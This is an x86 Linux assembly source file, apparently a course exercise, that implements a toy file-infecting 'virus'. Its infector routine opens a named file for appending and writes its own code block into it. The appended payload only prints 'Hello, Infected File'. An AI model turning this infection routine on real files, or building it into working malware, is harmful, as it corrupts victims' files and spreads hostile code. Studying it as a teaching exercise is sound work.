section .data
hello_message db 'Hello, Infected File', 0xA ; Message followed by newline character
hello_len equ $-hello_message

newline db 0xA ; Newline character

failMessage db 'Fail', 0 ; Define the string "Fail"

section .bss
file_descriptor resd 1 ; Reserve space for file descriptor (4 bytes)

section .text
global _start
global system_call
global infection
global infector
global start_code
global end_code
extern main
extern strlen

_start:
    pop dword ecx ; ecx = argc
    mov esi, esp ; esi = argv
    mov eax, ecx ; put the number of arguments into eax
    shl eax, 2 ; compute the size of argv in bytes
    add eax, esi ; add the size to the address of argv
    add eax, 4 ; skip NULL at the end of argv
    push dword eax ; char *envp[]
    push dword esi ; char* argv[]
    push dword ecx ; int argc

    call main ; int main(int argc, char *argv[], char *envp[])

    mov ebx, eax
    mov eax, 1
    int 0x80
    nop

system_call:
    push ebp ; Save caller state
    mov ebp, esp
    sub esp, 4 ; Leave space for local var on stack
    pushad ; Save some more caller state

    mov eax, [ebp + 8] ; Copy function args to registers: leftmost...
    mov ebx, [ebp + 12] ; Next argument...
    mov ecx, [ebp + 16] ; Next argument...
    mov edx, [ebp + 20] ; Next argument...
    int 0x80 ; Transfer control to operating system
    mov [ebp - 4], eax ; Save returned value...
    popad ; Restore caller state (registers)
    mov eax, [ebp - 4] ; place returned value where caller can see it
    add esp, 4 ; Restore caller state
    pop ebp ; Restore caller state
    ret ; Back to caller

infection:
start_code:
	push ebp ; Save caller state
    mov ebp, esp
    pushad ; Save some more caller state

    mov eax, 4 ; System call number for write
    mov ebx, 1 ; File descriptor number for stdout
    mov ecx, hello_message ; Message to write
    mov edx, hello_len ; Number of bytes to write
    int 0x80 ; Call kernel

	popad ; Restore caller state (registers)
	pop ebp ; Restore caller state
    ret ; Back to caller
    ret
end_code:
infector:
    push ebp ; Save caller state
    mov ebp, esp
    pushad ; Save some more caller state

    ; Print file name
    
    mov ebx, 1 ; File descriptor number for stdout
    mov ecx, [ebp + 8] ; Filename is at [ebp+8]
	push ecx ;
    call strlen
    mov edx, eax ; Number of bytes to write
	mov eax, 4 ; System call number for write
    int 0x80 ; Call kernel

    pop eax; pop return value from strlen

    ; Open the file for appending
    mov eax, 5 ; System call number for open
    mov ebx, [ebp + 8] ; The first parameter to open is the filename
    mov ecx, 1025 ; The second parameter is the flags. 1025 = O_WRONLY | O_APPEND
    int 0x80 ; Execute the system call

    cmp eax, 0 ; Compare the file descriptor with 0
    jl error ; If the file descriptor is less than 0 (indicating an error), jump to exit
    mov [file_descriptor], eax ; Store the file descriptor

    ; Add the virus executable code to the file
    mov eax, 4 ; System call number for write
    mov ebx, [file_descriptor] ; File descriptor number for infected file
    mov ecx, start_code ; Start of executable code
    mov edx, end_code ; End of executable code
    sub edx, ecx ; Calculate the size of the virus code
    int 0x80 ; Call kernel

    ; Close the file
    mov eax, 6 ; System call number for close
    mov ebx, [file_descriptor] ; File descriptor to close
    int 0x80 ; Call kernel

    popad ; Restore caller state (registers)
	pop ebp ; Restore caller state
    ret ; Back to caller
    ret

error:
     ; Write fail message to stdout
    mov eax, 4 ; System call number for write
    mov ebx, 1 ; File descriptor number for stdout
    mov ecx, failMessage ; Pointer to the string
    mov edx, 4 ; Number of bytes to write
    int 0x80 ; Call kernel


    mov eax, 1
    mov ebx, 0x55
    int 0x80